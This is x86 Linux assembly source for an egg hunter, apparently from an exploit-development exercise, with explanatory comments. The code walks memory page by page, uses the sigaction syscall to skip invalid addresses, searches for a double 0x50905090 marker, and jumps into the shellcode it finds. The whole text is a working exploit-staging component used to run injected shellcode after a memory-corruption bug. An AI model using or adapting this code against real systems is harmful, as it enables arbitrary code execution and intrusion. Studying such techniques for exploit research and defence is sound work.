global _start
section .text
_start:

Go_to_next_page:
or cx,0xfff     ; page alignment

Go_to_next_address:
inc ecx
push byte +0x43       ; sigaction syscall 67
pop eax               ; store it in eax
int 0x80              ; interrupt
cmp al,0xf2           ; compare if the return value is EFAULT (0xf2) which
                      ;mean invalid address jump to next page.
jz Go_to_next_page    ; jump if we got invalid address, else go on.
mov eax,0x50905090    ; here we store the egg in eax
mov edi,ecx           ; we store the valid address in edi because we will
                      ;use "scasd".

scasd                 ;scasd compare the eax and value of edi ([edi]) then
                      ;increment the edi by 4, so next time we use "scasd"
                      ;it will compare eax with [edi+4]

jnz Go_to_next_address           ; here jump to the next address if the comparison
                                 ;didn't match , else go on.

scasd                          ;  compare eax with [edi+4]..
jnz Go_to_next_address         ; if didn't match go to next address , else jump to
                               ;edi (shellcode).
jmp edi                        ; jump to shellcode

